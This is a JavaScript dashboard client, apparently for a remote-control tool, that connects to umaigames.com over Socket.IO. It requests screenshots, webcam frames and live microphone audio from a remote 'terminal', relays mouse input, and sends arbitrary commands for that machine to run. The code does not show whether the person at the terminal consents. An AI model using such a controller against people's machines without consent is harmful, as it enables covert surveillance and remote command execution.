var info = {
  // UZAK SUNUCU İÇİN (umaigames.com - Electron ile aynı):
  host: "umaigames.com", // Electron ile aynı host kullanılmalı
  port: 80,
  
  // YEREL TEST İÇİN:
  // host: "localhost",
  // port: 3011,
  
  dashboardId: new Date().getTime() + "-" + Math.floor(Math.random() * 99999),
};

// Electron ile aynı basit bağlantı ayarlarını kullan
// ÖNEMLİ: Port'u açıkça belirtmek gerekiyor - aksi halde tarayıcı HTTPS'e yönlendirebilir
// Mixed content (HTTP->HTTPS) sorununu önlemek için HTTP ve port açıkça belirtilmeli
var socketUrl = "http://" + info.host + ":" + info.port;
console.log("🔌 Socket bağlantısı deneniyor:", socketUrl);

var socket = io.connect(socketUrl, {
  // Port'u açıkça belirt - Mixed content sorununu önle
  forceNew: true,
  // Transport ayarları
  transports: ['polling', 'websocket'],
  // Reconnection ayarları
  reconnection: true,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  maxReconnectionAttempts: 5,
  // Timeout
  timeout: 20000
});

// Bağlantı başarılı
socket.on("connect", function() {
  console.log("✅ Web Socket bağlantısı başarılı:", socket.id);
  console.log("Bağlanılan sunucu:", "http://" + info.host + ":" + info.port);
});

// Bağlantı hatalarını yakala
socket.on("connect_error", function(error) {
  console.error("❌ Socket bağlantı hatası:", error.message);
  console.error("Sunucuya bağlanılamıyor:", "http://" + info.host + ":" + info.port);
  console.error("Hata detayı:", error);
  
  if (error.message.includes("Bad request")) {
    console.error("💡 'Bad request' hatası genellikle Socket.IO versiyon uyumsuzluğu veya transport sorunudur.");
    console.error("💡 Sunucunun Socket.IO v4 kullandığından emin olun.");
  } else if (error.message.includes("timeout") || error.message.includes("xhr poll error")) {
    console.error("💡 Bağlantı zaman aşımı - Sunucu çalışmıyor olabilir veya port kapalı.");
    console.error("💡 Kontrol edin:");
    console.error("   1. Sunucu çalışıyor mu? (cd web/server && node server.js)");
    console.error("   2. Port 3011 açık mı?");
    console.error("   3. Firewall portu engelliyor mu?");
    if (info.host === "umaigames.com") {
      console.error("   4. umaigames.com sunucusunda port 3011 açık mı?");
      console.error("   5. Reverse proxy (Nginx/Apache) yapılandırması doğru mu?");
      console.error("   6. CORS ayarları doğru mu? (Sunucuda origin: '*' olmalı)");
      console.error("   7. Tarayıcı console'da CORS hatası var mı?");
    }
  } else if (error.message.includes("CORS")) {
    console.error("💡 CORS hatası - Sunucuda CORS ayarlarını kontrol edin.");
    console.error("💡 Sunucuda cors: { origin: '*' } olmalı.");
  }
  
  // Mixed content (HTTP->HTTPS) hatası kontrolü
  if (error.message.includes("Mixed Content") || 
      (error.message.includes("https://") && socketUrl.includes("http://"))) {
    console.error("💡 MIXED CONTENT HATASI TESPİT EDİLDİ!");
    console.error("💡 Tarayıcı HTTP'den HTTPS'e yönlendiriyor.");
    console.error("💡 Çözüm:");
    console.error("   1. umaigames.com sunucusunda HTTP->HTTPS yönlendirmesini kontrol edin");
    console.error("   2. HSTS (HTTP Strict Transport Security) header'ını kontrol edin");
    console.error("   3. Sunucu yapılandırmasında port 3011 için HTTP'ye izin verin");
    console.error("   4. Veya HTTPS üzerinden çalışacak şekilde sunucuyu yapılandırın");
  }
});

socket.on("connect_timeout", function() {
  console.error("⏱️ Socket bağlantı zaman aşımı");
});

function getScreenshot() {
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    screen: $(".select").val(),
    dimension: $(".screen").val(), // Max width: 1280, max height: 720
  };
  socket.emit("screenshotRequest", data);
}

function getCamShot(one = false) {
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    screen: $(".select").val(),
    dimension: $(".screen").val(), // Max width: 1280, max height: 720
    one,
  };
  socket.emit("camShotRequest", data);
}

function startAudioListen() {
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    action: "start"
  };
  socket.emit("audioListenRequest", data);
}

function stopAudioListen() {
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    action: "stop"
  };
  socket.emit("audioListenRequest", data);
  
  // Audio URL'yi temizle
  if (currentAudioUrl) {
    URL.revokeObjectURL(currentAudioUrl);
    currentAudioUrl = null;
  }
  
  // Audio element'i temizle
  const audioElement = document.getElementById("audioStream");
  audioElement.src = "";
  
  console.log("🔇 Audio stream stopped and cleaned up (2s intervals)");
}

socket.on("connect", function () {
  console.log(socket.id);
  socket.emit("joinToRoom", { roomName: "dashboard-" + info.dashboardId });
});

socket.on("disconnect", function () {
  console.log("Disconnected !");
});

socket.on("screenshotResponse", function (data) {
  !!data.src ? console.log('+') : console.log('-');

  if (data.src.length > 0) {
    $(".listOfScreensAndWindows").html(
      '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
      data.src +
      "></div>"
    );
  }
  getScreenshot();
});

socket.on("camShotResponse", function (data) {
  $(".listOfScreensAndWindows").html(
    '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
    data.src +
    "></div>"
  );
  //getCamShot();
});

// Binary transfer response handler
socket.on("camBinary", function (data) {
  const blob = new Blob([data.data], { type: 'image/jpeg' });
  const url = URL.createObjectURL(blob);
  $(".listOfScreensAndWindows").html(
    '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src="' + url + '"></div>'
  );
  // URL'yi temizle
  setTimeout(() => URL.revokeObjectURL(url), 1000);
});

// Audio stream response handler - basit 2 saniye yaklaşımı
let currentAudioUrl = null;

socket.on("audioStreamResponse", function (data) {
  console.log("🎵 Audio stream response received from server");
  
  if (data.audioData) {
         console.log("🎵 Audio chunk received (20s):", data.audioData.length, "chars (base64)");
    
    try {
      // Base64'ten binary'e çevir
      const binaryString = atob(data.audioData);
      const bytes = new Uint8Array(binaryString.length);
      for (let i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }
      
      console.log("🔧 Binary data size:", bytes.length, "bytes");
      
      // MIME type belirle
      let mimeType = 'audio/webm';
      if (data.mimeType) {
        mimeType = data.mimeType;
      }
      
      console.log("🔧 Creating audio blob with MIME type:", mimeType);
      
      // Blob oluştur
      const blob = new Blob([bytes], { type: mimeType });
      const url = URL.createObjectURL(blob);
      
      console.log("🔗 Created blob URL:", url);
      
      // Eski URL'yi temizle
      if (currentAudioUrl) {
        URL.revokeObjectURL(currentAudioUrl);
      }
      
      currentAudioUrl = url;
      
      // Audio element'i güncelle
      const audioElement = document.getElementById("audioStream");
      audioElement.src = url;
      audioElement.volume = 1.0; // Maksimum volume
      
      // Ses şiddetini artırmak için ek ayarlar
      audioElement.muted = false;
      audioElement.preload = "auto";
      
             console.log("🎯 Audio element updated with new 20-second chunk");
      
      // Otomatik oynat
      audioElement.play().then(() => {
                 console.log("✅ Audio playing successfully (20s chunk)");
      }).catch(e => {
        console.error("❌ Audio play error:", e);
        console.error("Error details:", e.message);
      });
      
    } catch (error) {
      console.error("❌ Error processing audio data:", error);
    }
  } else {
    console.log("⚠️ No audio data in response");
  }
});

// Audio listen status handler
socket.on("audioListenStatus", function (data) {
  const statusText = document.getElementById("audioStatusText");
  
  if (data.status === "started") {
    console.log("Audio listening started - high sensitivity mode");
    statusText.textContent = "Listening (high sensitivity)...";
    statusText.className = "text-success";
  } else if (data.status === "stopped") {
    console.log("Audio listening stopped");
    statusText.textContent = "Stopped";
    statusText.className = "text-muted";
  } else if (data.status === "error") {
    console.error("Audio listening error:", data.error);
    statusText.textContent = "Error: " + data.error;
    statusText.className = "text-danger";
    // Alert'i kaldır - sadece console'da göster
    console.log("Audio stream error occurred:", data.error);
  }
});

$(document).ready(function () {
  if (localStorage.getItem("terminalId")) {
    $(".terminalId").val(localStorage.getItem("terminalId"));
  }
});

$(document).on("change", ".terminalId", function () {
  localStorage.setItem("terminalId", $(this).val());
});

$(document).on("click", ".screenshotBtn", function () {
  getScreenshot();
});

$(document).on("click", ".camShotBtn", function () {
  getCamShot();
});

$(document).on("click", ".oneCamShotBtn", function () {
  getCamShot(true);
});

$(document).on("click", ".startListenBtn", function () {
  console.log("Start Listen button clicked");
  startAudioListen();
});

$(document).on("click", ".stopListenBtn", function () {
  console.log("🛑 Stop Listen button clicked");
  stopAudioListen();
});

$(document).on("click", ".listOfScreensAndWindows", function () {
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
  };
  socket.emit("click", data);
});
$(document).on("mousemove", ".listOfScreensAndWindows", function (e) {
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    screen: $(".select").val(),
    webScreen: {
      width: $(".listOfScreensAndWindows").width(),
      height: $(".listOfScreensAndWindows").height(),
    },
    mousePosition: {
      x: e.pageX - $(".listOfScreensAndWindows").offset().left,
      y: e.pageY - $(".listOfScreensAndWindows").offset().top,
    },
  };
  socket.emit("mousemove", data);
});

socket.on("getRunResponse", function (data) {
  console.log({ getRunResponse: data });
  $(".cmdArea").text(data.cmd);
});

function getRun() {
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    cmd: $(".cmd").val(),
  };
  socket.emit("getRunRequest", data);
}

$(document).on("click", ".runBtn", function () {
  getRun();
});

// Test audio function
function testAudio() {
  console.log("🧪 Testing audio element...");
  const audioElement = document.getElementById("audioStream");
  
  // Audio element durumunu kontrol et
  console.log("Audio element:", audioElement);
  console.log("Audio src:", audioElement.src);
  console.log("Audio volume:", audioElement.volume);
  console.log("Audio muted:", audioElement.muted);
  console.log("Audio readyState:", audioElement.readyState);
  console.log("Audio networkState:", audioElement.networkState);
  
  // Test sesi çal - basit beep sesi
  const audioContext = new (window.AudioContext || window.webkitAudioContext)();
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  oscillator.frequency.setValueAtTime(440, audioContext.currentTime); // A note
  gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
  
  oscillator.start(audioContext.currentTime);
  oscillator.stop(audioContext.currentTime + 0.5);
  
  console.log("🔊 Test beep sound played");
  
  // Socket bağlantısını test et
  console.log("🔌 Socket connected:", socket.connected);
  console.log("🔌 Socket id:", socket.id);
}
